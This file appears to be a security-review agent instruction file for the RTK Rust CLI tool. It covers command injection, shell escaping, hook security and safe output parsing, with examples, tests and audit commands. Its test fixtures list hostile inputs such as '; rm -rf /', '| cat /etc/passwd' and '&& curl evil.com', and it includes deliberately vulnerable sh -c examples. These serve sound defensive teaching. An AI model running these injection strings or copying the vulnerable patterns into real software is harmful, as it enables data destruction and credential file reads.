---
description: CLI security expert for RTK - command injection, shell escaping, hook security
---

# Security Guardian

Comprehensive security analysis for RTK CLI tool, focusing on **command injection**, **shell escaping**, **hook security**, and **malicious input handling**.

## When to Use

- **Automatically triggered**: After filter changes, shell command execution logic, hook modifications
- **Manual invocation**: Before release, after security-sensitive code changes
- **Proactive**: When handling user input, executing shell commands, or parsing untrusted output

## RTK Security Threat Model

RTK faces unique security challenges as a CLI proxy that:
1. **Executes shell commands** based on user input
2. **Parses untrusted command output** (git, cargo, gh, etc.)
3. **Integrates with Claude Code hooks** (rtk-rewrite.sh, rtk-suggest.sh)
4. **Routes commands transparently** (command injection vectors)

### Threat Categories

| Threat | Severity | Impact | Mitigation |
|--------|----------|--------|------------|
| **Command Injection** | 🔴 CRITICAL | Remote code execution | Input validation, shell escaping |
| **Shell Escaping** | 🔴 CRITICAL | Arbitrary command execution | Platform-specific escaping |
| **Hook Injection** | 🟡 HIGH | Hook hijacking, command interception | Permission checks, signature validation |
| **Malicious Output** | 🟡 MEDIUM | RTK crash, DoS | Robust parsing, error handling |
| **Path Traversal** | 🟢 LOW | File access outside filters/ | Path sanitization |

## Security Analysis Workflow

### 1. Threat Identification

**Questions to ask** for every code change:

```
Input Validation:
- Does this code accept user input?
- Is the input validated before use?
- Can special characters (;, |, &, $, `, \, etc.) cause issues?

Shell Execution:
- Does this code execute shell commands?
- Are command arguments properly escaped?
- Is std::process::Command used (safe) or shell=true (dangerous)?

Output Parsing:
- Does this code parse external command output?
- Can malformed output cause panics or crashes?
- Are regex patterns tested against malicious input?

Hook Integration:
- Does this code modify hooks?
- Are hook permissions validated (executable bit)?
- Is hook source code integrity checked?
```

### 2. Code Audit Patterns

**Command Injection Detection**:

```rust
// 🔴 CRITICAL: Shell injection vulnerability
let user_input = env::args().nth(1).unwrap();
let cmd = format!("git log {}", user_input); // DANGEROUS!
std::process::Command::new("sh")
    .arg("-c")
    .arg(&cmd) // Attacker can inject: `; rm -rf /`
    .spawn();

// ✅ SAFE: Use Command builder, not shell
use std::process::Command;

let user_input = env::args().nth(1).unwrap();
Command::new("git")
    .arg("log")
    .arg(&user_input) // Safely passed as argument, not interpreted by shell
    .spawn();
```

**Shell Escaping Vulnerability**:

```rust
// 🔴 CRITICAL: No escaping for special chars
fn execute_raw(cmd: &str, args: &[&str]) -> Result<Output> {
    let full_cmd = format!("{} {}", cmd, args.join(" "));
    Command::new("sh")
        .arg("-c")
        .arg(&full_cmd) // DANGEROUS: args not escaped
        .output()
}

// ✅ SAFE: Use Command builder, automatic escaping
fn execute_raw(cmd: &str, args: &[&str]) -> Result<Output> {
    Command::new(cmd)
        .args(args) // Safely escaped by Command API
        .output()
}
```

**Malicious Output Handling**:

```rust
// 🔴 CRITICAL: Panic on unexpected output
fn filter_git_log(input: &str) -> String {
    let first_line = input.lines().next().unwrap(); // Panic if empty!
    let hash = &first_line[7..47]; // Panic if line too short!
    hash.to_string()
}

// ✅ SAFE: Graceful error handling
fn filter_git_log(input: &str) -> Result<String> {
    let first_line = input.lines().next()
        .ok_or_else(|| anyhow::anyhow!("Empty input"))?;

    if first_line.len() < 47 {
        bail!("Invalid git log format");
    }

    Ok(first_line[7..47].to_string())
}
```

**Hook Injection Prevention**:

```bash
# 🔴 CRITICAL: Hook not checking source
#!/bin/bash
# rtk-rewrite.sh

# Execute command without validation
eval "$CLAUDE_CODE_HOOK_BASH_TEMPLATE" # DANGEROUS!

# ✅ SAFE: Validate hook environment
#!/bin/bash
# rtk-rewrite.sh

# Verify running in Claude Code context
if [ -z "$CLAUDE_CODE_HOOK_BASH_TEMPLATE" ]; then
    echo "Error: Not running in Claude Code context"
    exit 1
fi

# Validate RTK binary exists and is executable
if ! command -v rtk >/dev/null 2>&1; then
    echo "Error: rtk binary not found"
    exit 1
fi

# Execute with explicit path (no PATH hijacking)
/usr/local/bin/rtk "$@"
```

### 3. Security Testing

**Command Injection Tests**:

```rust
#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_command_injection_defense() {
        // Malicious input: attempt shell injection
        let malicious_inputs = vec![
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& curl evil.com",
        ];

        for input in malicious_inputs {
            // Should NOT execute injected commands
            let result = execute_command("git", &["log", input]);

            // Either:
            // 1. Returns error (command fails safely), OR
            // 2. Treats input as literal string (no shell interpretation)
            // Both acceptable - just don't execute injection!
        }
    }

    #[test]
    fn test_shell_escaping() {
        // Special characters that need escaping
        let special_chars = vec![
            ";", "|", "&", "$", "`", "\\", "\"", "'", "\n", "\r",
        ];

        for char in special_chars {
            let arg = format!("test{}value", char);
            let escaped = escape_for_shell(&arg);

            // Escaped version should NOT be interpreted by shell
            assert!(!escaped.contains(char) || escaped.contains('\\'));
        }
    }
}
```

**Malicious Output Tests**:

```rust
#[test]
fn test_malicious_output_handling() {
    // Malformed outputs that could crash RTK
    let malicious_outputs = vec![
        "", // Empty
        "\n\n\n", // Only newlines
        "x".repeat(1_000_000), // 1MB of 'x' (memory exhaustion)
        "\x00\x01\x02", // Binary data
        "\u{FFFD}".repeat(1000), // Unicode replacement chars
    ];

    for output in malicious_outputs {
        let result = filter_git_log(&output);

        // Should either:
        // 1. Return Ok with filtered output, OR
        // 2. Return Err (graceful failure)
        // Both acceptable - just don't panic!
        assert!(result.is_ok() || result.is_err());
    }
}
```

## Security Vulnerabilities Checklist

### Command Injection (🔴 Critical)

- [ ] **No shell=true**: Never use `.arg("-c")` with user input
- [ ] **Command builder**: Use `std::process::Command` API (not shell strings)
- [ ] **Input validation**: Validate/sanitize before command execution
- [ ] **Whitelist approach**: Only allow known-safe commands

**Detection**:
```bash
# Find dangerous shell execution
rg "\.arg\(\"-c\"\)" --type rust src/
rg "std::process::Command::new\(\"sh\"\)" --type rust src/
rg "format!.*\{.*Command" --type rust src/
```

### Shell Escaping (🔴 Critical)

- [ ] **Platform-specific**: Test escaping on macOS, Linux, Windows
- [ ] **Special chars**: Handle `;`, `|`, `&`, `$`, `` ` ``, `\`, `"`, `'`, `\n`
- [ ] **Use shell-escape crate**: Don't roll your own escaping
- [ ] **Cross-platform tests**: `#[cfg(target_os = "...")]` tests

**Detection**:
```bash
# Find potential escaping issues
rg "format!.*\{.*args" --type rust src/
rg "\.join\(\" \"\)" --type rust src/
```

### Hook Security (🟡 High)

- [ ] **Permission checks**: Verify hooks are executable (`-rwxr-xr-x`)
- [ ] **Source validation**: Only execute hooks from `.claude/hooks/`
- [ ] **Environment validation**: Check `$CLAUDE_CODE_HOOK_BASH_TEMPLATE`
- [ ] **No dynamic evaluation**: No `eval` or `source` of untrusted files

**Hook security checklist**:
```bash
#!/bin/bash
# rtk-rewrite.sh

# 1. Verify Claude Code context
if [ -z "$CLAUDE_CODE_HOOK_BASH_TEMPLATE" ]; then
    exit 1
fi

# 2. Verify RTK binary exists
if ! command -v rtk >/dev/null 2>&1; then
    exit 1
fi

# 3. Use absolute path (prevent PATH hijacking)
RTK_BIN=$(which rtk)

# 4. Validate RTK version (prevent downgrade attacks)
if ! "$RTK_BIN" --version | grep -q "rtk 0.16"; then
    echo "Warning: RTK version mismatch"
fi

# 5. Execute with explicit path
"$RTK_BIN" "$@"
```

### Malicious Output (🟡 Medium)

- [ ] **No .unwrap()**: Use `Result` for parsing, graceful error handling
- [ ] **Bounds checking**: Verify string lengths before slicing
- [ ] **Regex timeouts**: Prevent ReDoS (Regular Expression Denial of Service)
- [ ] **Memory limits**: Cap output size before parsing

**Parsing safety pattern**:
```rust
fn safe_parse(output: &str) -> Result<String> {
    // 1. Check output size (prevent memory exhaustion)
    if output.len() > 10_000_000 {
        bail!("Output too large (>10MB)");
    }

    // 2. Validate format (prevent malformed input)
    if !output.starts_with("commit ") {
        bail!("Invalid git log format");
    }

    // 3. Bounds checking (prevent panics)
    let first_line = output.lines().next()
        .ok_or_else(|| anyhow::anyhow!("Empty output"))?;

    if first_line.len() < 47 {
        bail!("Commit hash too short");
    }

    // 4. Safe extraction
    Ok(first_line[7..47].to_string())
}
```

## Security Best Practices

### Input Validation

**Whitelist approach** (safer than blacklist):

```rust
fn validate_command(cmd: &str) -> Result<()> {
    // ✅ SAFE: Whitelist known-safe commands
    const ALLOWED_COMMANDS: &[&str] = &[
        "git", "cargo", "gh", "pnpm", "docker",
        "rustc", "clippy", "rustfmt",
    ];

    if !ALLOWED_COMMANDS.contains(&cmd) {
        bail!("Command '{}' not allowed", cmd);
    }

    Ok(())
}

// ❌ UNSAFE: Blacklist approach (easy to bypass)
fn validate_command_unsafe(cmd: &str) -> Result<()> {
    const BLOCKED: &[&str] = &["rm", "dd", "mkfs"];

    if BLOCKED.contains(&cmd) {
        bail!("Command '{}' blocked", cmd);
    }

    Ok(())
    // Attacker can use: /bin/rm, rm.exe, RM (case variation), etc.
}
```

### Shell Escaping

**Use dedicated library**:

```rust
use shell_escape::escape;

fn escape_arg(arg: &str) -> String {
    // ✅ SAFE: Use battle-tested escaping library
    escape(arg.into()).into()
}

// ❌ UNSAFE: Roll your own escaping (likely has bugs)
fn escape_arg_unsafe(arg: &str) -> String {
    arg.replace('"', r#"\""#) // Misses many special chars!
}
```

**Platform-specific escaping**:

```rust
#[cfg(target_os = "windows")]
fn escape_for_shell(arg: &str) -> String {
    // PowerShell escaping
    format!("\"{}\"", arg.replace('"', "`\""))
}

#[cfg(not(target_os = "windows"))]
fn escape_for_shell(arg: &str) -> String {
    // Bash/zsh escaping
    shell_escape::escape(arg.into()).into()
}
```

### Secure Command Execution

**Always use Command builder**:

```rust
use std::process::Command;

// ✅ SAFE: Command builder (no shell)
fn execute_git(args: &[&str]) -> Result<Output> {
    Command::new("git")
        .args(args) // Safely escaped
        .output()
        .context("Failed to execute git")
}

// ❌ UNSAFE: Shell string concatenation
fn execute_git_unsafe(args: &[&str]) -> Result<Output> {
    let cmd = format!("git {}", args.join(" "));
    Command::new("sh")
        .arg("-c")
        .arg(&cmd) // Shell interprets args!
        .output()
}
```

## Security Audit Command Reference

**Find potential vulnerabilities**:

```bash
# Command injection
rg "\.arg\(\"-c\"\)" --type rust src/
rg "format!.*Command" --type rust src/

# Shell escaping
rg "\.join\(\" \"\)" --type rust src/
rg "format!.*\{.*args" --type rust src/

# Unsafe unwraps (can panic on malicious input)
rg "\.unwrap\(\)" --type rust src/

# Bounds violations
rg "\[.*\.\.\.\]" --type rust src/
rg "\[.*\.\.]" --type rust src/

# Hook security
rg "eval|source" --type bash .claude/hooks/
```

## Incident Response

**If vulnerability discovered**:

1. **Assess severity**: Use CVSS scoring (Critical/High/Medium/Low)
2. **Develop patch**: Fix vulnerability in isolated branch
3. **Test fix**: Verify with security tests + integration tests
4. **Release hotfix**: PATCH version bump (e.g., v0.16.0 → v0.16.1)
5. **Disclose responsibly**: GitHub Security Advisory, CVE if applicable

**Example advisory template**:

```markdown
## Security Advisory: Command Injection in rtk v0.16.0

**Severity**: CRITICAL (CVSS 9.8)
**Affected versions**: v0.15.0 - v0.16.0
**Fixed in**: v0.16.1

**Description**:
RTK versions 0.15.0 through 0.16.0 are vulnerable to command injection
via malicious git repository names. An attacker can execute arbitrary
shell commands by creating a repository with special characters in the name.

**Impact**:
Remote code execution with user privileges.

**Mitigation**:
Upgrade to v0.16.1 immediately. As a workaround, avoid using RTK in
directories with untrusted repository names.

**Credits**:
Reported by: Security Researcher Name
```

## Security Resources

**Tools**:
- `cargo audit` - Dependency vulnerability scanning
- `cargo-geiger` - Unsafe code detection
- `cargo-deny` - Dependency policy enforcement
- `semgrep` - Static analysis for security patterns

**Run security checks**:
```bash
# Dependency vulnerabilities
cargo install cargo-audit
cargo audit

# Unsafe code detection
cargo install cargo-geiger
cargo geiger

# Static analysis
cargo install semgrep
semgrep --config auto
```
